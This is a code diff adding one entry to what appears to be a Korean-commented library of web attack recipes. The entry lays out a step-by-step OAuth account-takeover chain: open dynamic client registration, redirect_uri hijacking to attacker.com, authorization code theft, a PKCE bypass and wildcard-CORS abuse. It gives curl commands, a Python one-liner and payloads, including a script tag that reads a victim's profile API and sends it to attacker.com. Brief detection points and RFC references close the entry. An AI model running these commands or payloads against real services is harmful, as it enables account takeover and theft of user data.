@@ -1467,6 +1467,103 @@ print([r.status_code for r in results])""",
     ),
 },
 
+# ── v3.2.65 ──────────────────────────────────────────────────────────────────
+"sec-web-oauth-open-reg": {
+    "name": "OAuth 오픈 클라이언트 등록 → 체인 계정 탈취",
+    "module": "SecSkills-Web",
+    "tags": ["oauth", "auth-bypass", "account-takeover", "pkce", "cors", "open-registration"],
+    "desc": (
+        "/.well-known/oauth-authorization-server → registration_endpoint 발견 → "
+        "미인증 클라이언트 등록 → redirect_uri 조작 → 인증 코드 탈취 → "
+        "PKCE 우회 → 와일드카드 CORS 악용 → 계정 탈취 완전 체인"
+    ),
+    "tools": ["curl", "burpsuite", "python3"],
+    "commands": [
+        # Step 1: 디스커버리 — OAuth 메타데이터 엔드포인트 탐지
+        "curl -s https://TARGET/.well-known/oauth-authorization-server | python3 -m json.tool",
+        "curl -s https://TARGET/.well-known/openid-configuration | python3 -m json.tool",
+        "# registration_endpoint 키 존재 여부 확인",
+
+        # Step 2: 미인증 클라이언트 등록 (Open Dynamic Client Registration)
+        "curl -s -X POST https://TARGET/oauth/register \\"
+        "  -H 'Content-Type: application/json' \\"
+        "  -d '{\"client_name\":\"poc\",\"redirect_uris\":[\"https://attacker.com/cb\"]}' \\"
+        "  | python3 -m json.tool",
+        "# client_id / client_secret 응답 확인 (인증 없이 등록되면 취약)",
+
+        # Step 3: 공격자 redirect_uri로 인가 코드 요청
+        "# 브라우저에서 피해자가 아래 URL 방문하도록 유도",
+        "# https://TARGET/oauth/authorize"
+        "?client_id=ATTACKER_CLIENT_ID"
+        "&redirect_uri=https%3A%2F%2Fattacker.com%2Fcb"
+        "&response_type=code"
+        "&scope=openid+profile+email"
+        "&state=csrf_token_here",
+
+        # Step 4: 인가 코드 교환 (PKCE 없이 가능한 경우)
+        "curl -s -X POST https://TARGET/oauth/token \\"
+        "  -H 'Content-Type: application/x-www-form-urlencoded' \\"
+        "  -d 'grant_type=authorization_code"
+        "&code=AUTH_CODE_FROM_CALLBACK"
+        "&redirect_uri=https://attacker.com/cb"
+        "&client_id=ATTACKER_CLIENT_ID"
+        "&client_secret=ATTACKER_CLIENT_SECRET'",
+
+        # Step 5: PKCE 우회 확인 (code_verifier 없이 교환 시도)
+        "# PKCE 강제 여부 확인 — code_challenge 없이 /authorize 통과되면 취약",
+        "curl -s -X POST https://TARGET/oauth/token \\"
+        "  -d 'grant_type=authorization_code&code=CODE&redirect_uri=...&client_id=...'",
+
+        # Step 6: 와일드카드 CORS 악용 (토큰 API에서 CORS 헤더 확인)
+        "curl -s -I -X OPTIONS https://TARGET/api/me \\"
+        "  -H 'Origin: https://attacker.com' \\"
+        "  -H 'Access-Control-Request-Method: GET'",
+        "# Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true → CORS 취약",
+
+        # Step 7: 탈취한 액세스 토큰으로 계정 정보 조회
+        "curl -s https://TARGET/api/me -H 'Authorization: Bearer ACCESS_TOKEN'",
+        "curl -s https://TARGET/api/profile -H 'Authorization: Bearer ACCESS_TOKEN'",
+
+        # 보조 자동화 스크립트
+        "python3 -c \""
+        "import requests, json; "
+        "r = requests.post('https://TARGET/oauth/register', "
+        "json={'client_name':'poc','redirect_uris':['https://attacker.com/cb']}); "
+        "print(json.dumps(r.json(), indent=2))\"",
+    ],
+    "payloads": [
+        # 미인증 클라이언트 등록 페이로드
+        '{"client_name":"poc","redirect_uris":["https://attacker.com/cb"],'
+        '"grant_types":["authorization_code"],"response_types":["code"]}',
+        # redirect_uri 조작 변형
+        "redirect_uri=https://attacker.com/cb",
+        "redirect_uri=https://TARGET.attacker.com/cb",
+        "redirect_uri=https://attacker.com%2540TARGET/cb",
+        # CORS PoC (브라우저 실행용)
+        "<script>fetch('https://TARGET/api/me',{credentials:'include'})"
+        ".then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))</script>",
+    ],
+    "notes": (
+        "[체인 구조] "
+        "1) /.well-known/oauth-authorization-server → registration_endpoint 노출 "
+        "2) 인증 없이 클라이언트 등록 가능 (Open Dynamic Client Registration) "
+        "3) 등록된 attacker client_id로 피해자 인가 흐름 시작 "
+        "4) redirect_uri 조작 → 인가 코드가 attacker.com으로 전달 "
+        "5) PKCE 미강제 → code_verifier 없이 토큰 교환 성공 "
+        "6) 와일드카드 CORS → JS에서 직접 API 크로스오리진 읽기 가능 "
+        "7) 액세스 토큰/JWT → 피해자 계정 완전 탈취. "
+        "[탐지 포인트] "
+        "registration_endpoint 인증 필요 여부, "
+        "redirect_uri 화이트리스트 엄격 검사, "
+        "PKCE (code_challenge_method=S256) 강제, "
+        "CORS: Credentials+Wildcard 동시 허용 금지, "
+        "토큰 audience/issuer 검증. "
+        "[레퍼런스] RFC 7591 (Dynamic Client Registration), "
+        "OAuth 2.0 Security BCP (RFC 9700), "
+        "OWASP API Security — Broken Authentication"
+    ),
+},
+
 }
 
 # 인덱스 생성
